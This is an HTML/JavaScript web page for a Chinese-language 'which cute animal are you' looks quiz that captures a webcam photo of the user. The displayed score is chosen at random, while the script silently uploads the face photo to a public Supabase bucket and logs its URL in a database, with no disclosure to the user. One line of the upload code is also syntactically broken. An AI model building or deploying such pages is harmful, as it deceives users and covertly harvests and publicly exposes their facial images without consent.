<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🐾 萌寵動物系顏值診斷 🐾</title>
  <link href="https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&family=Zen+Maru+Gothic:wght@500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-color: #e0f2fe;        /* 天空淺藍背景 */
      --card-bg: #ffffff;          /* 純白卡片 */
      --primary-color: #3b82f6;    /* 活潑藍色 */
      --accent-color: #bae6fd;     /* 雲朵粉藍邊框 */
      --highlight-color: #fef08a;  /* 明亮鵝黃Accent */
      --text-color: #334155;       /* 深藍灰字體 */
      --btn-hover: #2563eb;
    }

    body {
      font-family: 'Zen Maru Gothic', sans-serif;
      background-color: var(--bg-color);
      /* 腳印點綴背景圖案 */
      background-image: radial-gradient(#bae6fd 15%, transparent 16%),
                        radial-gradient(#bae6fd 15%, transparent 16%);
      background-size: 30px 30px;
      background-position: 0 0, 15px 15px;
      color: var(--text-color);
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background: var(--card-bg);
      border: 4px solid var(--accent-color);
      border-radius: 30px;
      padding: 30px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 12px 24px rgba(56, 189, 248, 0.25);
      text-align: center;
      position: relative;
    }

    .animal-ear-left, .animal-ear-right {
      position: absolute;
      top: -25px;
      width: 50px;
      height: 50px;
      background: var(--card-bg);
      border: 4px solid var(--accent-color);
      border-radius: 50% 50% 0 0;
    }
    .animal-ear-left { left: 40px; transform: rotate(-15deg); }
    .animal-ear-right { right: 40px; transform: rotate(15deg); }

    h1 {
      font-family: 'Mochiy Pop One', sans-serif;
      color: var(--primary-color);
      font-size: 22px;
      margin-top: 10px;
      margin-bottom: 5px;
      text-shadow: 2px 2px 0px #fff, 3px 3px 0px var(--accent-color);
    }

    p.subtitle {
      font-size: 14px;
      color: #64748b;
      margin-top: 0;
      margin-bottom: 20px;
    }

    .camera-box {
      width: 100%;
      height: 280px;
      border: 3px dashed #93c5fd;
      border-radius: 25px;
      background-color: #f0f9ff;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      margin-bottom: 20px;
    }

    video, img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .btn {
      background-color: var(--primary-color);
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 17px;
      font-weight: bold;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 5px 0px #93c5fd;
      transition: all 0.2s ease;
      font-family: 'Zen Maru Gothic', sans-serif;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }

    .btn:hover {
      background-color: var(--btn-hover);
      transform: translateY(-2px);
      box-shadow: 0 7px 0px #93c5fd;
    }

    .btn:active {
      transform: translateY(3px);
      box-shadow: 0 2px 0px #93c5fd;
    }

    /* 評分結果區塊 */
    .result-card {
      display: none;
      margin-top: 20px;
      padding: 18px;
      background: #f0fdf4;
      border-radius: 20px;
      border: 3px solid #bbf7d0;
      animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
    }

    @keyframes bounceIn {
      0% { transform: scale(0.7); opacity: 0; }
      80% { transform: scale(1.05); }
      100% { transform: scale(1); opacity: 1; }
    }

    .score {
      font-size: 46px;
      font-weight: bold;
      color: #0284c7;
      font-family: 'Mochiy Pop One', sans-serif;
      margin: 8px 0;
    }

    .comment {
      font-size: 14px;
      line-height: 1.6;
      color: #334155;
    }

    .badge {
      display: inline-block;
      background: var(--highlight-color);
      color: #854d0e;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- 可愛小耳朵裝飾 -->
    <div class="animal-ear-left"></div>
    <div class="animal-ear-right"></div>

    <h1>🐶 動物系顏值大診斷 🐱</h1>
    <p class="subtitle">拍一張照片，看看你是哪種萌萌動物吧！</p>

    <div class="camera-box" id="cameraBox">
      <video id="webcam" autoplay playsinline></video>
      <canvas id="canvas" style="display:none;"></canvas>
      <img id="photoPreview" style="display:none;" alt="照片預覽">
    </div>

    <button class="btn" id="snapBtn" onclick="takePhoto()">🐾 開始喵喵診斷</button>

    <div class="result-card" id="resultCard">
      <div class="badge" id="animalBadge">✨ 診斷結果 ✨</div>
      <div class="score" id="scoreValue">98分</div>
      <div class="comment" id="commentText">評語載入中...</div>
    </div>
  </div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // https://upwdkejyxbluxkivrvsw.supabase.co
    const SUPABASE_URL = 'https://upwdkejyxbluxkivrvsw.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_X4X0Bdl4tlo1UjeTdqvwxg_QFLmMXH4';
    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const webcam = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const photoPreview = document.getElementById('photoPreview');
    const resultCard = document.getElementById('resultCard');
    const scoreValue = document.getElementById('scoreValue');
    const commentText = document.getElementById('commentText');
    const animalBadge = document.getElementById('animalBadge');

    // 啟動鏡頭
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        webcam.srcObject = stream;
      } catch (err) {
        alert("無法讀取鏡頭，請確認已授權鏡頭權限！");
      }
    }

    // 隨機評語資料
    const results = [
      { badge: "🐱 軟萌貓咪系", score: "98 分", comment: "擁有無辜的大眼睛與高貴優雅的氣質，讓人忍不住想摸摸頭！" },
      { badge: "🐶 忠誠柴犬系", score: "95 分", comment: "充滿親和力與陽光笑容，治癒感滿分，大家最喜歡跟你在一起！" },
      { badge: "🐰 軟綿兔子系", score: "99 分", comment: "無辜感滿載，靈動的小眼神讓人秒融化，是團寵般的存在！" },
      { badge: "🦊 聰慧小狐狸系", score: "96 分", comment: "帶有一絲神秘與睿智的眼神，精明又不失可愛，魅力爆表！" }
    ];

    async function takePhoto() {
      // 1. 將 video 畫面繪製到 canvas
      const context = canvas.getContext('2d');
      canvas.width = webcam.videoWidth || 300;
      canvas.height = webcam.videoHeight || 300;
      context.drawImage(webcam, 0, 0, canvas.width, canvas.height);

      // 2. 轉換成圖片顯示
      photoPreview.src = canvas.toDataURL('image/png');
      webcam.style.display = 'none';
      photoPreview.style.display = 'block';

      // 3. 隨機抽選診斷結果
      const randomResult = results[Math.floor(Math.random() * results.length)];
      animalBadge.innerText = randomResult.badge;
      scoreValue.innerText = randomResult.score;
      commentText.innerText = randomResult.comment;
      resultCard.style.display = 'block';

      // 4. 將 Canvas 轉成 Blob 並上傳至 Supabase
      canvas.toBlob(async (blob) => {
        try {
          const fileName = photo_${Date.now()}.png;

          // 上傳圖片到 Supabase Storage (桶子名稱請確保叫做 pet-photos)
          const { data: uploadData, error: uploadError } = await _supabase.storage
            .from('pet-photos')
            .upload(fileName, blob);

          if (uploadError) throw uploadError;

          // 取得該圖片的公開網址
          const { data: { publicUrl } } = _supabase.storage
            .from('pet-photos')
            .getPublicUrl(fileName);

          // 將圖片網址與診斷結果寫入 Supabase Database 的 diagnoses 表格
          const { error: dbError } = await _supabase
            .from('diagnoses')
            .insert([
              { 
                image_url: publicUrl, 
                score: randomResult.score, 
                comment: randomResult.comment 
              }
            ]);

          if (dbError) throw dbError;
          console.log("照片與結果已成功儲存至 Supabase！");

        } catch (err) {
          console.error("上傳失敗：", err.message);
        }
      }, 'image/png');
    }

    // 頁面載入時啟動相機
    window.onload = initCamera;
  </script>
</body>
</html>
